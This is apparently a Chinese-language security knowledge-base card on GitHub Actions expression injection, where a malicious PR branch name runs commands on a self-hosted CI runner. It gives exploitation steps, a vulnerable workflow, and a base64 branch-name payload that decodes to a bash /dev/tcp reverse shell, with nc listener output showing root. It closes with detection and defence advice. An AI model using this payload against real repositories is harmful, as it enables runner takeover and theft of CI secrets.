---
id: cloud-cicd-github-actions-pr-head-ref-expression-injection-rce
title: GitHub Actions 表达式注入：PR 分支名（head.ref）经 github-script 输出进入 run 脚本导致 CI 命令执行
type: scenario
domain: cloud
path: cloud/ci-cd
technique: github-actions-pr-head-ref-script-injection
aliases:
- GitHub Actions 表达式注入
- head.ref 注入
- PR 分支名命令注入
- issue_comment 工作流注入
- ${{ }} 脚本注入
- CI 命令执行
tags:
- ci-cd
- github-actions
- expression-injection
- command-injection
- pull-request
- issue-comment
- rce
- self-hosted-runner
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V343
  verified_at: '2026-11-08T22:17:33+08:00'
  notes: 已对照原文图03-06核对 issue_comment+self-hosted 工作流、github-script 返回 pr.data.head.ref、分支名 payload 与触发评论；Base64 解码与 root 回连与原文一致；原文未给受影响版本。
---

## 一句话结论

当工作流把不可信的 GitHub 上下文（如 PR 的 `head.ref` 分支名）通过 `${{ }}` 直接插入 `run:` 脚本时，GitHub 只是在 shell 解析前做文本替换，分支名里的 `"`、`;`、`{`、`|` 会闭合字符串并注入命令；攻击者创建一个分支名为 `";{echo,<base64>}|{base64,-d}|{bash,-i};echo"` 的 PR，再评论触发 `issue_comment` 工作流，就能在自托管 runner 上执行 Base64 编码的反向 shell（文中获得 root shell）。

## 原理

- **`${{ }}` 是文本替换而非转义**：GitHub Actions 在运行时把表达式求值结果原样拼进脚本/YAML，之后才交给 shell。若结果进入 `run:` 的双引号字符串，分支名中的双引号可以闭合字符串，分号/管道即可追加任意命令。
- **分支名是攻击者可控的上下文**：PR 的 `head.ref`（源分支名）由攻击者创建分支时决定，Git 允许 `"`、`;`、`{`、`}`、`|` 等字符（GitHub 只提示可能存在隐藏字符，并未阻止）。`actions/github-script` 把 `pr.data.head.ref` 作为 step output 返回，下一步 `run: branch="${{ steps.ref.outputs.result }}"` 就把它拼进 shell。
- **触发链路**：工作流 `on: issue_comment` 且 `runs-on: self-hosted`；攻击者提交 PR（分支名带 payload），在 PR 下评论即可触发；`github-script` 用 `context.issue.number` 取 PR 号并读取 `head.ref`。
- **payload 结构**：`";{echo,<base64>}|{base64,-d}|{bash,-i};echo"` 用 brace expansion 把 `echo` 与 Base64 串拼成命令，`base64 -d` 解出 `sh -i >& /dev/tcp/<ip>/<port> 0>&1`，再由 `bash -i` 执行；Base64 让 payload 在分支名/日志中不出现明文 `sh`、`/dev/tcp`，也避开部分关键字检查。
- **为什么危害大**：工作流跑在自托管 runner 上，runner 常带云凭据、部署密钥、`GITHUB_TOKEN`、甚至以 root 运行；一次注入即可拿到 CI 环境的全部秘密与网络位置。
- **同类上下文**：`github.event.issue.title`、`github.event.pull_request.title/body`、`github.event.comment.body`、`github.head_ref` 等一切可由外部用户写入的字段，只要进入 `run:`/`script:` 就有同样风险。

## 触发条件

- 工作流使用 `issue_comment`、`pull_request`、`pull_request_target` 等外部可触发事件。
- 工作流把不可信上下文直接写进 `run:` 或 `actions/github-script` 的 `script:`（未经过 `env:` 中转与引号保护）。
- 攻击者能创建 PR/分支并发表评论（公开仓库或组织内权限）。
- runner 能出网（反向 shell）或至少能执行命令。

## 利用步骤

1. 侦察目标仓库的 `.github/workflows/*.yml`：找 `on: issue_comment`/`pull_request`、`runs-on: self-hosted`，以及 `${{ ... }}` 直接出现在 `run:` 中的步骤。
2. 构造分支名 payload（示例）：`";{echo,<base64(reverse shell)>}|{base64,-d}|{bash,-i};echo"`；Base64 内容为 `sh -i >& /dev/tcp/<attacker_ip>/<port> 0>&1`。
3. 从该分支向目标仓库提交 PR（分支名即 payload）。
4. 在 PR 下发表任意评论（如 `trigger vuln`），触发 `issue_comment` 工作流。
5. 工作流执行 `git checkout $branch` 时，shell 先执行注入的命令，反向 shell 回连攻击者；文中 `nc` 收到连接并执行 `id` 得到 `uid=0(root)`。
6. 在 runner 上收集环境变量、凭据、token，继续横向（参见 [[cloud-cicd-github-app-private-key-runner-registration-token]]）。

## PoC

```yaml
# 脆弱写法（示意，对应文中工作流）
on:
  issue_comment:
jobs:
  check-pr:
    runs-on: self-hosted
    steps:
      - id: ref
        uses: actions/github-script@v4
        with:
          result-encoding: string
          script: |
            const pr = await github.pulls.get({ owner, repo, pull_number: context.issue.number });
            return pr.data.head.ref;      # 攻击者可控的分支名
      - run: |
          branch="${{ steps.ref.outputs.result }}"
          git checkout $branch
```

```text
# 攻击者分支名（示意）
";{echo,c2ggLWkgPiYgL2Rldi90Y3AveC54LngueC84MCAwPiYxCg==}|{base64,-d}|{bash,-i};echo"

# Base64 解码结果
sh -i >& /dev/tcp/x.x.x.x/80 0>&1

# 回连
$ rlwrap nc -lvp 80
# id
uid=0(root) gid=0(root) groups=0(root)
```

## 变体与关联

- 变体：注入点换成 `github.event.issue.title`、`pull_request.title/body`、`comment.body`、`github.head_ref`；`actions/github-script` 的 `script:` 里直接拼字符串同样可注入。
- 变体：不弹 shell，改为把 `GITHUB_TOKEN`/secrets 写到日志或外部地址；或用 `curl` 拉取二阶段脚本。
- [[cloud-cicd-github-actions-pull-request-target-checkout-rce]]：`pull_request_target` 检出外部 PR 代码并用攻击者 Dockerfile 构建的另一类 Actions 供应链风险，与本卡的「上下文表达式注入」不同。
- [[cloud-cicd-actions-log-base32-secret-exfiltration-no-c2]]：拿到 runner 后的日志外带信道。
- 边界：工作流使用 `env:` 中转并加引号（`"$BRANCH"`）、对上下文做白名单校验、或事件不对外部用户开放时注入不成立。

## 检测与防御

- 防御：永远不要把 `${{ }}` 直接嵌入 `run:`/`script:`；改为 `env: BRANCH: ${{ github.head_ref }}` 后使用带引号的 `"$BRANCH"`，并对分支名做白名单（如 `[A-Za-z0-9._/-]+`）。
- 防御：限制 `issue_comment`/`pull_request_target` 工作流的权限与 secrets 暴露；工作流默认 `permissions: read-all`，只在必要 job 提权；自托管 runner 不放长期凭据。
- 检测：审计工作流中 `run:` 行内出现 `${{`；监控分支名含引号/分号/管道/花括号的 PR；监控 runner 上异常 `bash -i`、`/dev/tcp`、base64 解码与出站连接。
- 响应：删除异常 runner 会话与凭据、轮换 secrets 和 `GITHUB_TOKEN`、检查 runner 上是否被植入持久化。
